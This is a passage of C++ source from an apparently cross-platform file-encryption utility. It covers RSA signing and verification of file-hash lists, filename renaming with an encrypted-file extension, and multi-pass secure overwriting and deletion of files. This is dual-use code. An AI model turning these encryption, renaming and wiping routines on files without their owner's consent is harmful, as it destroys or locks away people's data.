	CryptInfo->hash_data.HashList->SLIST_INSERT_HEAD_SAFE(hash);
	if (GLOBAL_STATE.g_print_hash)
	{
		unsigned char* hex = memory::BinaryToHex(out, 32);
		LOG_INFO("HashSum  %s\tFilename " log_str, hex, Filename);
		memory::m_free(hex);
	}

	memory::m_free(buff_hash);
	return true;
}


static void dump_hash(BYTE* hash_bin, size_t len)
{
	BYTE* hex = memory::BinaryToHex(hash_bin, len);
	LOG_NONE("%s", hex);
	memory::m_free(hex);
}

bool filesystem::VerifySignatureRSA
(
	SLIST<HASH_LIST>* HashList
)
{
	BOOL success = FALSE;
	bool isCrypt = GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT ? true : false;
	PHASH_LIST DataHash = NULL;
	CRYPT_INFO CryptInfo = {};
	DESC desc = INVALID_HANDLE_VALUE;
	TCHAR* PathLocale = NULL;
	BYTE* SignatureBuffer = NULL;

	if (GLOBAL_PATH.g_PathSignRSAKey == NULL)
	{
		LOG_ERROR("[VerifySignatureRSA] Failed; missing path key to signature");
		return FALSE;
	}

	CryptInfo.desc.key_data = (BYTE*)memory::m_malloc(4096);
	DWORD ResultLength = 0;
#ifdef _WIN32
	NTSTATUS status;
	CryptInfo.desc.crypto_provider = NULL;
	CryptInfo.desc.handle_rsa_key = NULL;
#else
	EVP_PKEY_CTX* ctx = NULL;
	CryptInfo.desc.PKEY = NULL;
	CryptInfo.desc.bio = NULL;
#endif
	CryptInfo.desc.rsa_path = GLOBAL_PATH.g_PathSignRSAKey;
	if (isCrypt)
		GLOBAL_ENUM.g_DeCrypt = EncryptCipher::DECRYPT;
	else
		GLOBAL_ENUM.g_DeCrypt = EncryptCipher::CRYPT;
	if (!ReadRSAFile(&CryptInfo))
	{
		LOG_ERROR("[ReadRSAFile] Failed; " log_str, CryptInfo.desc.rsa_path);
		goto end;
	}
#ifdef _WIN32
	if (CryptInfo.desc.crypto_provider == NULL || CryptInfo.desc.handle_rsa_key == NULL)
	{
		LOG_ERROR("[DESCRIPTOR - PROVIDER] Failed; " log_str, CryptInfo.desc.rsa_path);
		goto end;
	}
#endif

	PathLocale = (TCHAR*)memory::m_malloc((MAX_PATH + MAX_PATH) * sizeof(Tsize));
	if (!api::GetCurrentDir(PathLocale, MAX_PATH))
	{
		LOG_ERROR("[VerifySignatureRSA] [GetCurrentDirectory] Failed");
		goto end;
	}
	memc(&PathLocale[memory::StrLen(PathLocale)], slash, 1);
	memc(&PathLocale[memory::StrLen(PathLocale)], T("signature.laced.bin"), 19);

	sort_hash_list(HashList);
	BYTE hash_sha[32];
	{
		sha256_state ctx;
		sha256_init_context(&ctx);
		SLIST_FOREACH(DataHash, HashList)
			sha256_update_context(&ctx, DataHash->hash, DataHash->hash_size);
		sha256_final_context(&ctx, hash_sha);
	}
	LOG_INFO("[VerifySignatureRSA] Dump Hash Sum");
	dump_hash(hash_sha, 32);

	if (isCrypt)
	{
		if (!CreateFileOpen(&desc, PathLocale))
		{
			LOG_ERROR("[VerifySignatureRSA] Failed; " log_str, PathLocale);
			goto end;
		}

#ifdef _WIN32
		SignatureBuffer = (BYTE*)memory::m_malloc(CryptInfo.desc.size);

		BCRYPT_PKCS1_PADDING_INFO paddingInfo;
		paddingInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;

		if (!HandleError
		(
			BCryptSignHash
			(
				CryptInfo.desc.handle_rsa_key, &paddingInfo,
				hash_sha, 32,
				SignatureBuffer, CryptInfo.desc.size,
				&ResultLength,
				BCRYPT_PAD_PKCS1)
		)
			)
		{
			LOG_ERROR("[BCryptSignHash] Failed");
			goto end;
		}
#else
		unsigned sig_len;
		if (!(ctx = EVP_PKEY_CTX_new(CryptInfo.desc.PKEY, NULL))
			|| (EVP_PKEY_sign_init(ctx) <= 0)
			|| (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_PADDING) <= 0)
			|| (EVP_PKEY_CTX_set_signature_md(ctx, EVP_sha256()) <= 0)
			|| (EVP_PKEY_sign(ctx, NULL, &sig_len, hash_sha, SHA256_DIGEST_LENGTH) <= 0))
		{
			LOG_ERROR("[SignatureRSA] Failed");
			err();
			goto end;
		}

		SignatureBuffer = (BYTE*)memory::m_malloc(sig_len);
		if (EVP_PKEY_sign(ctx, SignatureBuffer, &sig_len, hash_sha, SHA256_DIGEST_LENGTH) <= 0)
		{
			LOG_ERROR("[SignatureRSA] Failed get size");
			err();
			goto end;
		}
		ResultLength = sig_len;
#endif
		if (!WriteFullData(desc, SignatureBuffer, ResultLength))
		{
			LOG_ERROR("[VerifySignatureRSA] [WriteFullData] Failed; " log_str, PathLocale);
			goto end;
		}

		LOG_SUCCESS("[VerifySignatureRSA] SUCCESS; Signature saved in: " log_str, PathLocale);

	}
	else
	{
		unsigned filesize;
		if (!getParseFile(PathLocale, &desc, &filesize))
		{
			LOG_ERROR("[getParseFile] Failed");
			goto end;
		}
		SignatureBuffer = (BYTE*)memory::m_malloc(filesize);

		unsigned SignatureLength;
		if (!api::ReadFile(desc, SignatureBuffer, filesize, &SignatureLength))
		{
			LOG_ERROR("[ReadFile] Failed");
			goto end;
		}

#ifdef _WIN32
		BCRYPT_PKCS1_PADDING_INFO paddingInfo;
		paddingInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;
		if (!HandleError
		(
			status = BCryptVerifySignature
			(
				CryptInfo.desc.handle_rsa_key, &paddingInfo,
				hash_sha, 32,
				SignatureBuffer, SignatureLength,
				BCRYPT_PAD_PKCS1)
		)
			)
		{
			LOG_ERROR("[BCryptVerifySignature] Failed; %ls", PathLocale);
			if (status == 0xC000A000)
				LOG_ERROR("[BCryptVerifySignature] The cryptographic signature is INVALID");
			goto end;
		}
		else
			LOG_SUCCESS("[BCryptVerifySignature] The cryptographic signature is VALID");
#else

		if (!(ctx = EVP_PKEY_CTX_new(CryptInfo.desc.PKEY, NULL))
			|| (EVP_PKEY_verify_init(ctx) <= 0)
			|| (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_PADDING) <= 0)
			|| (EVP_PKEY_CTX_set_signature_md(ctx, EVP_sha256()) <= 0))
		{
			LOG_ERROR("[VerifySignatureRSA] Failed");
			err();
			goto end;
		}

		int ret = EVP_PKEY_verify(ctx, SignatureBuffer, SignatureLength, hash_sha, SHA256_DIGEST_LENGTH);
		if (ret == 1)
			LOG_SUCCESS("[VerifySignatureRSA] The cryptographic signature is VALID");
		else if (ret == 0)
			LOG_ERROR("[VerifySignatureRSA] The cryptographic signature is INVALID; %s", PathLocale);
		else
		{
			LOG_ERROR("[VerifySignatureRSA] Failed"); err(); goto end;
		}
#endif
	}

	success = TRUE;
end:
	if (desc)
		api::CloseDesc(desc);
	if (SignatureBuffer)
		memory::m_free(SignatureBuffer);
	if (PathLocale)
		memory::m_free(PathLocale);
	if (CryptInfo.desc.key_data)
	{
		memory::memzero_explicit(CryptInfo.desc.key_data, 4096);
		memory::m_free(CryptInfo.desc.key_data);
	}
#ifdef __linux__
	if (CryptInfo.desc.bio)
		BIO_free(CryptInfo.desc.bio);
	if (CryptInfo.desc.PKEY)
		EVP_PKEY_free(CryptInfo.desc.PKEY);
	if (ctx)
		EVP_PKEY_CTX_free(ctx);
#endif

	return success;
}

TCHAR* filesystem::OptionNameStandart(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath)
{
	size_t len_filename = memory::StrLen(Filename);
	TCHAR* name = (TCHAR*)memory::m_malloc((MAX_PATH + 1) * Tsize);

	if (memory::StrStr(exst, ECRYPT_NAME_P))
		memc(name, Filename, len_filename - ECRYPT_NAME_LEN);
	else
	{
		memc(name, Filename, len_filename);
		memc(&name[len_filename], ECRYPT_NAME_P, ECRYPT_NAME_LEN);
	}

	return name;
}



#ifdef _WIN32
static std::string TCHARToUtf8(const TCHAR* wstr, size_t len)
{
	if (!wstr || len == 0) return {};
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr, (int)len, NULL, 0, NULL, NULL);
	std::string str(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, wstr, (int)len, str.data(), size_needed, NULL, NULL);
	return str;
}

static std::wstring Utf8ToTCHAR(const char* str, size_t len)
{
	if (!str || len == 0) return {};
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, str, (int)len, NULL, 0);
	std::wstring wstr(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, str, (int)len, wstr.data(), size_needed);
	return wstr;
}

#else
static std::string TCHARToUtf8(const TCHAR* str, size_t len)
{
	return std::string(str, len);
}
static std::string Utf8ToTCHAR(const char* str, size_t len)
{
	return std::string(str, len);
}
#endif

TCHAR* filesystem::OptionNameHash(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath)
{
	size_t len_filename = memory::StrLen(Filename);
	TCHAR* name = (TCHAR*)memory::m_malloc((MAX_PATH + 1) * Tsize);

	if (memory::StrStr(exst, ECRYPT_NAME_P))
		memc(name, Filename, len_filename - ECRYPT_NAME_LEN);
	else
	{
	 	auto str = TCHARToUtf8(Filename, len_filename);
		unsigned char out[32] = { 0 };
		sha256((BYTE*)str.c_str(), len_filename, out);
		unsigned char* name_h = memory::BinaryToHex(out, 32);
		auto str_name = Utf8ToTCHAR((char*)name_h, 64);
		memc(name, str_name.c_str(), 64);
		memc(&name[64], ECRYPT_NAME_P, ECRYPT_NAME_LEN);
		memory::m_free(name_h);
	}

	return name;
}

TCHAR* filesystem::OptionNameBase(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath)
{
	size_t len_filename = memory::StrLen(Filename);
	TCHAR* name = (TCHAR*)memory::m_malloc((MAX_PATH + 1) * Tsize);

	if (memory::StrStr(exst, ECRYPT_NAME_P))
	{
		auto utf8_filename = TCHARToUtf8(Filename, len_filename);

		CHAR decoded[MAX_PATH + MAX_PATH];
		int bsize = 0;
		if (!base64::base64(BASE_E::DECODE,
			(const BYTE*)utf8_filename.data(),
			(int)utf8_filename.size() - ECRYPT_NAME_LEN,
			decoded, &bsize))
		{
			LOG_ERROR("[OptionNameBase] Failed; " log_str, Filename);
			memory::m_free(name);
			return OptionNameStandart(Path, Filename, exst, FPath);
		}

		auto wide_decoded = Utf8ToTCHAR(decoded, bsize);
		memc(name, wide_decoded.data(), wide_decoded.size());
	}
	else
	{
		auto utf8_filename = TCHARToUtf8(Filename, len_filename);
		CHAR encoded[MAX_PATH + MAX_PATH];
		int bsize = 0;
		if (!base64::base64(BASE_E::ENCODE,
			(const BYTE*)utf8_filename.data(),
			(int)utf8_filename.size(),
			encoded, &bsize))
		{
			LOG_ERROR("[OptionNameBase] Failed; " log_str, Filename);
			memory::m_free(name);
			return OptionNameStandart(Path, Filename, exst, FPath);
		}

		if (bsize > MAX_PATH)
		{
			LOG_ERROR("[OptionNameBase] Failed; ENAME TOO LONG; " log_str, Filename);
			memory::m_free(name);
			return OptionNameStandart(Path, Filename, exst, FPath);
		}

		auto wide_encoded = Utf8ToTCHAR(encoded, bsize);
		memc(name, wide_encoded.data(), wide_encoded.size());
		memc(&name[wide_encoded.size()], ECRYPT_NAME_P, ECRYPT_NAME_LEN);
	}

	return name;
}


TCHAR* filesystem::NameMethodState(PCRYPT_INFO CryptInfo, PDRIVE_INFO data)
{
	size_t len_path = memory::StrLen(data->Path);
	size_t len_FPath = memory::StrLen(data->FullPath);
	if (len_FPath >= 3840)
	{
		LOG_ERROR("[OptionName] Failed; FULL PATH TOO LONG; " log_str, data->FullPath);
		return NULL;
	}
	
	if(false)
	{
		size_t lenf = memory::StrLen(data->Filename);
		if((lenf + 5) > MAX_PATH)
		{
			LOG_ERROR("[NameMethodState] Failed; filename too long; " log_str, data->Filename);
			return NULL;
		}
		TCHAR* swp_name = (TCHAR*)memory::m_malloc((MAX_PATH + len_path) * Tsize);
		memc(swp_name, data->Path, len_path);
		memc(&swp_name[len_path], slash, 1);
		memc(&swp_name[len_path + 1], data->Filename, lenf);
		memc(&swp_name[len_path + 1 + lenf], T(".swp"), 4);
		return swp_name;
	}
	
	TCHAR* name = CryptInfo->name_method(data->Path, data->Filename, data->Exst, data->FullPath);
	if(name == NULL)
		return NULL;
	if(memory::StrLen(name) > MAX_PATH)
	{
		LOG_ERROR("[NameMethodState] Failed; filename too long; " log_str, data->Filename);
		return NULL;
	}

	TCHAR* fullpath = (TCHAR*)memory::m_malloc((MAX_PATH + len_path) * Tsize);
	if(GLOBAL_PATH.g_Path_out)
		memc(fullpath, GLOBAL_PATH.g_Path_out, memory::StrLen(GLOBAL_PATH.g_Path_out));
	else
		memc(fullpath, data->Path, len_path);

	memc(&fullpath[memory::StrLen(fullpath)], slash, 1);
	memc(&fullpath[memory::StrLen(fullpath)], name, memory::StrLen(name));
	memory::m_free(name);
	return fullpath;
}


static bool Write(DESC desc_file, unsigned filesize, BYTE* buff)
{
	size_t size_mb = 1048576;
	api::SetPoint(desc_file, 0);
	auto fsize = filesize;
	size_t toWrite;
	int written = 0;
	size_t offset = 0;
	while (fsize > 0)
	{
		toWrite = (size_t)fsize >= size_mb ? size_mb : fsize;
		if(!api::WriteFile(desc_file, (BYTE*)buff, toWrite, &written) || !written)
		{
			LOG_ERROR("Failed WriteFullData in OverWriteFile");
			return FALSE;
		}
		offset += written;
		fsize -= written;
	}

	return true;
}

bool filesystem::nopOverWriteFile(PCRYPT_INFO CryptInfo, DESC desc_file, unsigned filesize)
{
	return true;
}

bool filesystem::ZerosOverWriteFile(PCRYPT_INFO CryptInfo, DESC desc_file, unsigned filesize)
{
	for (int i = 0; i < GLOBAL_OVERWRITE.g_OverWriteCount; ++i)
	{
		if (!Write(desc_file, filesize, CryptInfo->zeros))
			return false;
	}
	return true;
}

bool filesystem::RandomOverWriteFile(PCRYPT_INFO CryptInfo, DESC desc_file, unsigned filesize)
{
	for (int i = 0; i < GLOBAL_OVERWRITE.g_OverWriteCount; ++i)
	{
		if (!Write(desc_file, filesize, CryptInfo->random))
			return false;
	}
	return true;
}

bool filesystem::DODOverWriteFile(PCRYPT_INFO CryptInfo, DESC desc_file, unsigned filesize)
{
	for (int i = 0; i < GLOBAL_OVERWRITE.g_OverWriteCount; ++i)
	{
		if (!Write(desc_file, filesize, CryptInfo->zeros))
			return false;
		if (!Write(desc_file, filesize, CryptInfo->random))
			return false;
	}
	return true;
}

bool filesystem::RewriteSDelete(CRYPT_INFO* CryptInfo, TCHAR* FullPath)
{
	bool success = false;
	DESC desc = INVALID_HANDLE_VALUE;
	unsigned filesize;
	if (!filesystem::getParseFile(FullPath, &desc, &filesize))
	{
		LOG_ERROR("[getParseFile] [RewriteSDelete] Failed; " log_str, FullPath);
		return false;
	}

	if (!CryptInfo->overwrite_method(CryptInfo, desc, filesize))
	{
		LOG_ERROR("[OverWriteFile] Failed; " log_str, FullPath);
		goto end;
	}


	if (!api::SetPoint(desc, FILE_BEGIN))
	{
		LOG_ERROR("[RewriteSDelete] Failed; " log_str, FullPath);
		goto end;
	}

#ifdef _WIN32
	if (!SetEndOfFile(desc))
	{
		LOG_ERROR("[RewriteSDelete] Failed; " log_str, FullPath);
		goto end;
	}
#else
	if (ftruncate(desc, 0) == -1)
	{
		LOG_ERROR("[RewriteSDelete] [ftruncate] Failed; %s", FullPath);
		goto end;
	}
#endif

	success = true;
#ifdef __linux
	fsync(desc);
#endif
end:
	if (desc != INVALID_HANDLE_VALUE)
		api::CloseDesc(desc);
#ifdef _WIN32
	if (success && !DeleteFileW(FullPath))
	{
		LOG_ERROR("Failed to unlink file after secure delete: %ls", FullPath);
		success = false;
	}
#else
	if (success && unlink(FullPath) != 0)
	{
		LOG_ERROR("Failed to unlink file after secure delete: %s", FullPath);
		success = false;
	}
#endif
	return success;
}

bool filesystem::hash_file(PCRYPT_INFO CryptInfo, DESC desc_file, TCHAR* Filename)
{
	DESC desc;
	unsigned fs;
	if (!filesystem::getParseFile(Filename, &desc, &fs) || desc == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; " log_str, Filename);
		return false;
	}

	HashSumFile(CryptInfo, desc, &Filename[desc_file]);

	api::CloseDesc(desc);
	return true;
}